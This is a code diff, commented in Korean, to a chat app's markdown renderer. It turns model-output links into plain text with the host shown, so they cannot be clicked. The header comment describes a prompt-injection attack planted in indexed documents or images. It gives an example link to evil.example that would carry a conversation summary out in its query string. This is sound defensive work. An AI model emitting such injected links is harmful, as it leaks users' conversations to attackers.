@@ -12,6 +12,10 @@ import remarkGfm from 'remark-gfm'
  * - **마크다운 이미지(`![](url)`)는 그리지 않는다(#359).** 그리면 모델 출력에 실린 바깥 주소를 브라우저가 곧바로 불러
  *   대화에서 뽑은 값이 쿼리로 새어 나갈 수 있다. 문서 그림은 이 경로가 아니라 그림 표식으로 온다.
  *   **자리에는 alt 문구만 남긴다(#365)** - 통째로 지우면 설명 글이 사라지고 `[![x](img)](url)` 은 글자 없는 빈 링크가 됐다
+ * - **마크다운 링크(`[글](url)`)도 누를 수 없는 글자로 낮춘다(#414).** 색인 문서나 첨부 이미지에 심은 프롬프트 주입으로 모델이
+ *   `[자세히](https://evil.example/?q=<대화 요약>)` 를 내면 한 번 클릭으로 대화 내용이 바깥으로 나간다 - 이미지와 같은 위협이다.
+ *   **글자 옆에 `(호스트)` 를 밝혀** 어디를 가리키는지는 보이게 하고, 호스트를 못 읽는 값(상대 경로 · http(s) 아님 · 깨진 값)은 글자만 남긴다.
+ *   출처 목록 · 그림처럼 앱이 만든 링크는 이 경로를 거치지 않는다
  * - 표는 가로로만 스크롤되는 상자에 넣는다 - 모바일 폭에서 화면 전체를 밀어내지 않게
  * - 그림 표식(`[[그림:키]]`)은 여기 오기 전에 잘려 나간다(splitFigures). 이 컴포넌트는 표식 사이의 글만 받는다
  * - **한국어 조사 앞의 굵게를 닫는다(#287).** 표준 강조 규칙은 닫는 `**` 앞이 문장부호 · 뒤가 글자면 안 닫는다 -
@@ -25,6 +29,17 @@ const subheading = ({ children }: { children?: ReactNode }) => (
   <h4 className="mt-3 mb-1.5 font-semibold first:mt-0">{children}</h4>
 )
 
+// 호스트를 읽을 수 있는 http(s) 주소만 호스트를 돌려준다 - 상대 경로 · 다른 스킴 · 깨진 값은 null
+function hostOf(href: string | undefined): string | null {
+  if (!href) return null
+  try {
+    const url = new URL(href)
+    return url.protocol === 'http:' || url.protocol === 'https:' ? url.host : null
+  } catch {
+    return null
+  }
+}
+
 const components: Components = {
   p: ({ children }) => <p className="my-2 break-words first:mt-0 last:mb-0">{children}</p>,
   ul: ({ children }) => <ul className="my-2 list-disc space-y-1 pl-5">{children}</ul>,
@@ -35,11 +50,15 @@ const components: Components = {
   h3: subheading,
   h4: subheading,
   strong: ({ children }) => <strong className="font-semibold">{children}</strong>,
-  a: ({ href, children }) => (
-    <a href={href} target="_blank" rel="noopener noreferrer" className="text-accent underline underline-offset-2">
-      {children}
-    </a>
-  ),
+  a: ({ href, children }) => {
+    const host = hostOf(href)
+    return (
+      <>
+        {children}
+        {host && ` (${host})`}
+      </>
+    )
+  },
   blockquote: ({ children }) => (
     <blockquote className="my-2 border-l-2 border-line pl-3 text-ink-muted">{children}</blockquote>
   ),
